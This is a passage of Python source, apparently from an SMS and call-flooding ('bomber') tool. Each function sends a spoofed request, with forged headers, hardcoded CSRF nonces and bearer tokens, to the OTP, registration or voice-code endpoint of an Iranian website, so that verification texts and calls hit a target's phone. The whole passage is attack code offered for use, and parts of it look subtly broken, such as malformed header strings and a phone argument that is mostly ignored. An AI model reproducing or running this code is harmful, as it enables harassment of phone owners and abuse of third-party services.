        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=d397aa3b0e&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A7%D8%AA%D8%B1%D8%AA%DB%8C%D8%A8%D8%A8&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=d397aa3b0e"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://raminashop.com','referer': 'https://raminashop.com/?login=true&page=1&redirect_to=https%3A%2F%2Framinashop.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://raminashop.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def sabziman(phone):
        n4 = f"action=newphoneexist&phonenumber=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def tajtehran(phone):
        n4 = f"mobile=0{('+90')[1]}&password=mamad1234"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def zivanpet(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://zivanpet.com','referer': 'https://zivanpet.com/?login=true&page=1&redirect_to=https%3A%2F%2Fzivanpet.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}

        try:
            post(url="https://zivanpet.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def okala(phone):
        n4 = {"mobile":"0"+ ('+90')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
        rhead = {'user-agent': generate_user_agent(os="win")}
        try:
            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=n4, headers=rhead)
            return True
        except:
            pass            
            
            
    def watchonline(phone):
        n4 = {"mobile":"0"+ ('+90')[1]}
        rhead = {'Host': 'api.watchonline.shop','Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','Accept': 'application/json','Content-Type': 'application/json','Authorization': 'Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b','Origin': 'https://www.watchonline.shop','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.watchonline.shop/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
        try:
            post(url="https://api.watchonline.shop/api/v1/otp/request",json=n4, headers=rhead)
            return True
        except:
            pass            
            
    def gharar(phone):
        n4 = f"phone=0{('+90')[1]}"
        rhead = {'content-length': '17','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG','sec-ch-ua-platform': 'Android','origin': 'https://gharar.ir','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://gharar.ir/','accept-encoding': 'gzip, deflate, br','accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
        try:
            post(url="https://gharar.ir/users/phone_number/",data=n4, headers=rhead)
            return True
        except:
            pass            
            
class call:
    def paklean_call(phone):
        n4 = {"username": "0"+("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
            return True
        except:
            pass
        
    def novinbook_call(phone):
        n4 = f"phone=0{('+90')[1]}&call=yes"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'} 
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            return True
        except:
            pass

    def azki_call(phone):
        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'}
        try:
            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{('+90')[1]}", headers=HEADER)
        except:
            pass

    def ragham_call(phone):
        # Call and sms 
        n4 = {"phone":phone}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
            return True
        except:
            pass                
